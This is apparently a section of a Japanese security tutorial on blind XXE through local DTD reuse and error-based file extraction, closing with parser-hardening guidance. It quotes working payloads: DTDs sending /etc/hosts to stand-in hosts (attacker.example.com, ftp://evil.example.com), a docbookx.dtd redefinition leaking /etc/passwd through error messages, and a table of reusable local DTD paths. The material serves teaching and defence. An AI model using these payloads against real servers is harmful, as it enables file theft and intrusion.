## ローカルDTD再利用（エラーベース抽出）

盲目XXE（Blind XXE）の中でも、この節で扱う「ローカルDTD再利用（local DTD reuse）」は、**攻撃者サーバへ一切通信できない環境でも、パーサのエラーメッセージだけを使って任意ファイルの中身を盗み出す**という、防御側にとって特に厄介な手口です。2018年に Arseniy Sharoglazov（mohemiv）が発表し、その年の「Top 10 Web Hacking Techniques」で7位に選ばれた、XXE史における重要なマイルストーンでもあります。

本節ではまず「なぜ普通のOOB（Out-of-Band、帯域外＝別チャネル経由）XXEが失敗するのか」を押さえ、次に「ローカルDTDを再利用するとなぜ突破できるのか」をパーサの内部挙動レベルで解き明かします。防御目的の理解に必要な範囲で、原典が公開した実物のペイロードを引用します。

> ⚠️ 本節の内容は、自組織のパーサ設定を検証し防御を設計するためのものです。実在サービスや本番環境に対する無許可の検証、破壊的な手順は行わないでください。

---

### 前提知識：パラメータ実体（parameter entity）の復習

まず用語を確認します。

- **実体（entity）**: XMLにおける「文字列の別名・マクロ」。`&name;` で本文に展開される。
- **パラメータ実体（parameter entity）**: `%name;` の形で参照する、**DTD（Document Type Definition＝文書型定義）の内部でしか使えない**特別な実体。DTDの定義を部品化して再利用するための仕組み。
- **外部パラメータ実体**: `SYSTEM` キーワードで外部リソース（ファイルやURL）を指し、参照時にその中身を読み込んで展開する。

```xml
<!DOCTYPE name [
  <!ENTITY % df '<!ELEMENT first (#PCDATA)>'>   <!-- 内部パラメータ実体 -->
  <!ENTITY % dl SYSTEM "external_file.dtd">      <!-- 外部パラメータ実体 -->
  %df;
  %dl;
]>
```

パラメータ実体が重要なのは、`file:///etc/passwd` のような**ローカルファイルの中身を変数に取り込み**、それを別の実体定義の中に埋め込んで別の場所（＝攻撃者URLやエラーメッセージ）へ運べるからです。盲目XXEの全テクニックはこの「実体の入れ子」を土台にしています。

> 出典: XXE 応用編（MBSD） — https://www.mbsd.jp/research/20171213/xxe2/

---

### まず素朴なOOB XXE：なぜ「外部DTD」が必要なのか

盲目XXEの典型は、**攻撃者が用意した外部DTD（evil.dtd）を読み込ませ、盗んだファイル内容を攻撃者サーバへ送り返させる**手法です。MBSDの記事が示す基本形は次の通りです。

被害サーバへ送るXML：

```xml
<!DOCTYPE name [
  <!ENTITY % remote SYSTEM "http://attacker.example.com/evil.dtd">
  %remote;
]>
<name><first>tarou</first><last>mitsui</last></name>
```

攻撃者サーバに置く `evil.dtd`：

```xml
<!ENTITY % payload SYSTEM "file:///etc/hosts">
<!ENTITY % param1 '<!ENTITY &#37; external
  SYSTEM "http://attacker.example.com/?%payload;">'>
%param1;
%external;
```

動作の流れを分解します。

1. `%payload;` が `/etc/hosts` の中身を読み込む。
2. `%param1;` が展開されると、`external` という新しいパラメータ実体が「攻撃者URLの末尾に `%payload;`（＝ファイル内容）を連結したもの」として **動的に定義される**。`&#37;` は `%` の文字参照で、DTD文法上ここでそのまま `%` と書けない制約を回避するためのエスケープ。
3. `%external;` を参照した瞬間、パーサはそのURLへHTTPアクセスし、ファイル内容がクエリ文字列として攻撃者サーバのログに残る。

#### 重要な文法制約：「内部サブセットでは入れ子参照が禁止」

ここで**この技術の核心となる制約**が登場します。上の `param1 → external` のような「パラメータ実体を定義する定義（入れ子の実体宣言）」は、XML仕様上、**外部DTD（external subset）の中でしか書けません**。文書に直接書く内部DTD（internal subset）でこれをやると、パーサは次のエラーを返して拒否します。

```
The parameter entity reference "%file;" cannot occur within markup
in the internal subset of the DTD.
```

これが「なぜ外部サーバに evil.dtd を置く必要があるのか」の理由です。逆に言えば——**外部サーバへ通信できない（ファイアウォールでegressが遮断されている）環境では、この王道が丸ごと使えなくなる**。ここがローカルDTD再利用の出発点です。

> 出典: Exploiting XXE with local DTD files（mohemiv, 2018） — https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/
> 出典: XXE 応用編（MBSD） — https://www.mbsd.jp/research/20171213/xxe2/

---

### ローカルDTD再利用のアイデア：「外部サブセット」を現地調達する

mohemivの発想はシンプルかつ強力です。

> 「入れ子の実体宣言が書けるのは外部DTDだけ。ならば、攻撃者サーバではなく**被害サーバ上にすでに存在するDTDファイル**を `file://` で読み込ませ、その中に自分のペイロードを紛れ込ませればよい。」

Linuxやアプリケーションサーバには、標準で多数の `.dtd` ファイルが同梱されています。それらを `file:///...` で読み込ませれば、その内容はパーサから見て「外部DTD（external subset）」として扱われます。つまり **egressゼロのまま外部サブセットの文脈を手に入れられる** のです。

しかし、ここで新たな壁が生まれます。ローカルDTDは攻撃者が中身を書けません。他人が書いた既存のDTDの中に、どうやって自分のペイロードを差し込むのか？ 答えが「**パラメータ実体の再定義（redefinition）**」です。

#### なぜ「再定義」が効くのか：最初の定義が勝つ

XMLの実体には次の規則があります。

> **同じ名前の実体が複数回宣言された場合、最初の宣言だけが有効で、後続の宣言は無視される。**

多くの標準DTDは、内部を部品化するために `<!ENTITY % something '...'>` という**パラメータ実体を自分で定義し、DTDの後半でそれを `%something;` として参照**しています。ということは——DTDを読み込ませる**前**に、攻撃者が同名のパラメータ実体を先に宣言しておけば、「最初の定義が勝つ」規則により、**DTD本来の定義が上書きされ、DTDが自分自身の後半で参照する箇所に、攻撃者のペイロードが差し込まれる**のです。

これがローカルDTD再利用の全メカニズムです。図式化すると：

```
[攻撃者が先に宣言] %target = 悪意ある実体定義群   ← 最初の定義なのでこれが採用される
[ローカルDTDを読み込み]
   ...
   <!ENTITY % target '本来の値'>   ← 2回目の定義なので無視される
   ...
   %target;   ← ここで攻撃者のペイロードが展開・実行される
```

---

### 実物のペイロード：docbookx.dtd を悪用する

mohemivの原典が挙げる代表的なターゲットの一つが、多くのLinuxに存在する `/usr/share/yelp/dtd/docbookx.dtd` です。このDTDは `%ISOamsa`（ISO標準記号エンティティ群）などのパラメータ実体を内部で定義・参照しています。これを再定義します。

```xml
<?xml version="1.0" ?>
<!DOCTYPE message [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">

  <!-- docbookx.dtd 内で使われる %ISOamsa を、読み込み前に再定義 -->
  <!ENTITY % ISOamsa '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM
        &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>

  %local_dtd;
]>
<message>any</message>
```

読み解きます。

- `%local_dtd;` を最後に参照した瞬間、`docbookx.dtd` が読み込まれ、その内部で `%ISOamsa;` が参照される。だが `ISOamsa` は既に攻撃者版で定義済みなので、**攻撃者のペイロードが外部サブセットの文脈で展開される**。
- `&#x25;` は `%` の16進文字参照。ペイロードは何段もの実体展開を経るため、`%` をそのまま書くと文法エラーになる。展開のタイミングをずらすために、文字参照で「後で `%` になる」ようにエスケープしている。同様に `&#x26;#x25;` は `&#x25;`（つまり最終的に `%`）へ、`&#x27;` は `'`（シングルクォート）へ展開される。この多段エスケープは「今すぐ展開してほしくない記号」と「後で展開してほしい記号」を制御するための定石。

このペイロードのコアは、原典が示す次の4行に集約されます。

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

- `%file;` … 盗みたいファイル（`/etc/passwd`）の中身を取り込む。
- `%eval;` … 展開されると、`error` という実体を「`file:///nonexistent/` の後ろに**ファイル内容そのものを連結したパス**を指す外部実体」として定義する。
- `%error;` … その存在しないパスを開こうとして、パーサが**例外を送出**する。

---

### エラーベース抽出の核心：なぜファイル内容がエラーに出るのか

`%error;` を参照すると、パーサは `file:///nonexistent/root:x:0:0:root:/root:/bin/bash%0a...`（`/etc/passwd` の中身を連結したパス）を開こうとします。当然そんなファイルは存在しないため、Javaのパーサなら次のような例外メッセージを吐きます。

```
java.io.FileNotFoundException:
  /nonexistent/root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  ... (以下ファイル内容が続く)
```

**ポイントは「エラーメッセージが開こうとしたパスをそのまま含む」こと**。そのパスにはファイル内容が埋め込まれているので、アプリがスタックトレースや500エラー本文を画面／APIレスポンスに返す実装だと、**攻撃者はエラー文字列を読むだけで機密ファイルを回収できる**わけです。攻撃者サーバへの通信は一切発生しません。これが「エラーベース（error-based）抽出」であり、egress遮断環境でも成立する理由です。

まとめると、この手法が成立する条件は次の通りです（原典より）。

- XMLパーサがDTD処理（外部パラメータ実体の解決）を有効にしている。
- ターゲット上に、内部でパラメータ実体を定義・参照している**既知のローカルDTDのパス**が存在する。
- **パーサのエラーメッセージが攻撃者に見える**（レスポンスに露出する）。

> 出典: Exploiting XXE with local DTD files（mohemiv, 2018） — https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/

---

### 「マークアップの途中」に注入する場合：`aaa)>` トリック

再定義するパラメータ実体が、DTD内で **`<!ELEMENT ...>` のようなマークアップ宣言の途中**で使われている場合、話が少し複雑になります。たとえばあるDTDが次のように書いているとします（`fontconfig` の `fonts.dtd` などが該当する典型パターン）。

```xml
<!ENTITY % constant "int|double|string|matrix|bool|charset|langset">
...
<!ELEMENT patelt (%constant;|name)*>   <!-- %constant が要素内容モデルの中で使われる -->
```

ここで `%constant` を単純に「新しい実体宣言」に置き換えると、それは `<!ELEMENT patelt ( ... )>` という**括弧の内側**に展開されてしまい、文法的に壊れます（実体宣言はマークアップの中には書けない）。

そこで原典は、再定義した値の**先頭でまず開いている構文を閉じ、末尾でダミーの宣言を開き直す**という手を使います。概念を示すと：

```xml
<!ENTITY % constant 'aaa)>
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM
        &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  <!ELEMENT aa (bb'>
```

- 先頭の `aaa)>` … 元の `<!ELEMENT patelt (` に対して `aaa)` で括弧を閉じ、`>` で `<!ELEMENT>` 宣言を完結させる。これで**マークアップの外**に出られる。
- 中央 … 通常の file/eval/error ペイロードを、独立した実体宣言として書く。
- 末尾の `<!ELEMENT aa (bb` … 元のDTDに残る `)*>` と繋がって `<!ELEMENT aa (bb)*>` という**辻褄の合ったダミー宣言**を形成し、全体を文法的に成立させる。

このように「注入先が要素内容モデルの中か、実体値として素直に展開される位置か」を見極め、必要なら閉じ括弧で脱出するのがローカルDTD再利用の実戦的なコツです。原典は各ターゲットDTDごとに、どのパラメータ実体を再定義し、どんな脱出が必要かをまとめています。

> 出典: Exploiting XXE with local DTD files（mohemiv, 2018） — https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/

---

### 既知のローカルDTDターゲット（原典より）

原典が「まず試すべき」として挙げた代表的なDTDの所在です。防御側にとっては「これらのファイルが存在すること自体は塞げない」ため、後述の**パーサ設定による根本対策**が必要だと理解する材料になります。

| OS / 製品 | ローカルDTDのパス | 再定義する実体 |
|---|---|---|
| Linux（yelp） | `/usr/share/yelp/dtd/docbookx.dtd` | `%ISOamsa` |
| Linux（scrollkeeper） | `/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd` | `%url.attribute.set` |
| Windows | `C:\Windows\System32\wbem\xml\cim20.dtd` | `%SuperClass` |
| IBM WebSphere | `./../../properties/schemas/j2ee/XMLSchema.dtd` | 複数実体の再定義が必要 |
| Citrix XenMobile 等（Tomcat同梱jar） | `jar:file:///.../jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd` | （jar内DTDを参照） |

`jar:` スキームの例が示すように、Javaでは**JARアーカイブ内のDTD**すら `file://` 相当で指定でき、ターゲットの選択肢は広がります。

> 出典: Exploiting XXE with local DTD files（mohemiv, 2018） — https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/

---

### 関連する落とし穴：複数行ファイルとJavaのURL制約（MBSD）

エラーベース抽出とは別に、OOB XXEで攻撃者サーバへ送り出す古典手法には、MBSDが詳述した**「複数行ファイルは送れない」障害**があります。これはローカルDTD再利用を理解するうえでも重要な、パーサ実装依存の挙動です。

Java 8u131以降では、外部実体のURLに**改行が含まれると例外**になります。MBSDが引用した `HttpURLConnection` 系の内部チェックはおおむね次の通りです。

```java
if (fileName.indexOf('\n') == -1)
    return fileName;
else
    throw new java.net.MalformedURLException("Illegal character in URL");
```

`/etc/passwd` のような複数行ファイルを `http://attacker/?%payload;` に連結すると、改行がエンコードされずそのまま入るため通信が失敗します。これに対しMBSDが示した回避策が2つあります。

1. **FTPプロトコルの利用**: `ftp://` で送ると、改行が「FTPコマンドの区切り」として解釈され、一部データが通信上に現れて取得できる場合がある。

    ```xml
    <!ENTITY % payload SYSTEM "file:///etc/hosts">
    <!ENTITY % param1 '<!ENTITY &#37; external
      SYSTEM "ftp://evil.example.com/%payload;">'>
    %param1;
    %external;
    ```

2. **1行ファイルで存在確認**: `/etc/host.conf`（通常 `multi on` の1行）のような単一行ファイルなら送信に成功する。1行なら成功・複数行なら失敗、という切り分けで環境の挙動を推測できる。

    ```xml
    <!ENTITY % payload SYSTEM "file:///etc/host.conf">
    ```

**なぜこれがローカルDTD再利用の魅力を高めるのか**——OOB送信は改行やURL制約に苦しむのに対し、**エラーベース抽出は攻撃者サーバへ送らない**ため、この種のプロトコル制約を回避しやすい。egress遮断・改行制約の両方を同時に突破できる点が、ローカルDTD再利用の実戦的な強みです。

なお、MBSDは内部ネットワークの存在確認にも外部実体が使える（応答時間差でIPの生死を推測）と示しています。

```xml
<!DOCTYPE name [
  <!ENTITY % d SYSTEM "http://192.0.2.11/">%d;
]>
<name><first>mitsui</first><last>taro</last></name>
```

> 出典: XXE 応用編（MBSD） — https://www.mbsd.jp/research/20171213/xxe2/

---

### 防御：どこで断ち切るか

ローカルDTD再利用は「攻撃者サーバへの通信」も「複数行送信」も不要なため、**ネットワーク層（egressフィルタ・WAFの通信検知）では原理的に防げません**。防御はパーサ設定に一元化するのが正解です。

1. **外部実体・DTD処理を完全に無効化する（最重要）**  
   ローカルDTD再利用は「外部パラメータ実体の解決」が入口。DOCTYPE自体を禁止するのが最も堅い。Java（JAXP）なら次のように**secure processing**とDTD禁止を設定します。

    ```java
    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
    // DOCTYPE 宣言自体を拒否（これ一つで XXE 全般を封じる最短ルート）
    dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
    // 外部一般実体・外部パラメータ実体を無効化
    dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
    dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
    dbf.setXIncludeAware(false);
    dbf.setExpandEntityReferences(false);
    ```

    `disallow-doctype-decl=true` を設定すれば、そもそも `<!DOCTYPE ...[ ... ]>` を含む文書が拒否されるため、ローカルDTD参照も実体再定義も起点から成立しません。DOCTYPEを許容せざるを得ない場合でも、**external-parameter-entities を false** にすれば `%local_dtd;` の `file://` 読み込みが止まり、本手法は無効化されます。

2. **XML_PARSE_NOENT / resolve-external-entities を有効化しない（言語別）**  
   libxml2系（PHP等）では `LIBXML_NOENT` を付けないこと、.NETなら `XmlResolver = null`、Pythonの `defusedxml` を使う、といった言語ごとの安全既定を徹底する。

3. **エラーメッセージを外に出さない（緩和）**  
   エラーベース抽出は「パーサ例外の中身がレスポンスに露出する」ことに依存します。スタックトレース・例外文字列をユーザーへ返さず、汎用エラーに丸める運用は**抽出チャネルを塞ぐ有効な緩和**になります（ただし根本対策1の代わりにはならない。ブラインド抽出やタイミング差など別チャネルが残るため、必ずパーサ側で断つこと）。

4. **最小権限・読み取り可能ファイルの削減**  
   XXEが成立してもアプリの実行ユーザーが `/etc/passwd` 等の機微ファイルを読めないよう権限を絞る。多層防御としての最後の砦。

---

### この節のまとめ

- ローカルDTD再利用は、**被害サーバ上の既存DTDを `file://` で読み込ませ**、そのDTDが自分で参照するパラメータ実体を**「最初の定義が勝つ」規則で再定義**して、外部サブセットの文脈にペイロードを注入する手法。
- 盗んだファイル内容を**存在しないパスに連結してパーサ例外を起こし、エラーメッセージからファイルを読み取る**（エラーベース抽出）。攻撃者サーバへの通信も複数行送信も不要。
- 注入先がマークアップの内側なら `aaa)>` で構文を脱出する。多段の実体展開に合わせ `&#x25;`（%）などの文字参照でエスケープ段数を制御する。
- **ネットワーク防御では防げない**。`disallow-doctype-decl` / `external-parameter-entities=false` などパーサ設定で外部DTD・外部パラメータ実体を無効化するのが唯一の根本対策。エラー非表示は補助的緩和。

> 出典: Exploiting XXE with local DTD files（mohemiv, 2018） — https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/
> 出典: XXE 応用編（MBSD） — https://www.mbsd.jp/research/20171213/xxe2/
